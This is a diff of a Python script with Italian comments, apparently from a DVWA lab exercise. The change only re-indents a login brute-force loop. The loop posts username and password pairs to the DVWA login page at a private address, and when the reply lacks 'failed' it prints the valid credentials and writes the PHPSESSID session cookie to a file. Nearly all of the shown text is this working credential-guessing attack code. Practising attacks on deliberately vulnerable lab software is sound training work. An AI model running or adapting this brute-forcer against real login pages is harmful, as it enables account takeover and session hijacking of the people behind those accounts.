@@ -33,23 +33,23 @@ for user in user_list:
                 sys.stdout.write("\033[K")
                 
                 #stampa user e pwd sulla stessa riga, separati dal "-"
-            print (user, "-", pwd)
+                print (user, "-", pwd)
             
-            #check degli headers contenenti nella richiesta di login   
-            headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/html,application/xhtml+xml"}
+                #check degli headers contenenti nella richiesta di login   
+                headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/html,application/xhtml+xml"}
 
-		#parametri da inserire per provare il bruteforce
-            post_par ={'username': user, 'password': pwd, 'Login':'Login'}
+		        #parametri da inserire per provare il bruteforce
+                post_par ={'username': user, 'password': pwd, 'Login':'Login'}
             
-            #dà la risposta del server, per verificare se effettivamente il bruteforce ha avuto successo. si potrebbe leggere se dopo questo comando segue print(risp.test)
-            risp=session.post('http://192.168.50.101/dvwa/login.php',post_par)
-		#se nella risposta del server non troviamo la scritta "failed", il bruteforce è riuscito alla perfezione, dando in output il log in con le credenziali valide, il phpsessid, e lo scrive nel file phpsessid.txt creato precedentemente. Successivamente, restituisce 1 alla variabile found e chiude il ciclo
-            if(risp.text.find("failed") == -1):
-                print(f"\n\n\nLog in!\nusername: {user}\npassword: {pwd}\n\nPHPSESSID:") 
-                print(f"{session.cookies.get_dict().get('PHPSESSID')}\n\n")
-                sessid_file.write(f"{session.cookies.get_dict().get('PHPSESSID')}")
-                found=1
-                break
+                #dà la risposta del server, per verificare se effettivamente il bruteforce ha avuto successo. si potrebbe leggere se dopo questo comando segue print(risp.test)
+                risp=session.post('http://192.168.50.101/dvwa/login.php',post_par)
+		        #se nella risposta del server non troviamo la scritta "failed", il bruteforce è riuscito alla perfezione, dando in output il log in con le credenziali valide, il phpsessid, e lo scrive nel file phpsessid.txt creato precedentemente. Successivamente, restituisce 1 alla variabile found e chiude il ciclo
+                if(risp.text.find("failed") == -1):
+                    print(f"\n\n\nLog in!\nusername: {user}\npassword: {pwd}\n\nPHPSESSID:") 
+                    print(f"{session.cookies.get_dict().get('PHPSESSID')}\n\n")
+                    sessid_file.write(f"{session.cookies.get_dict().get('PHPSESSID')}")
+                    found=1
+                    break
 
     if(found==1): 
         break
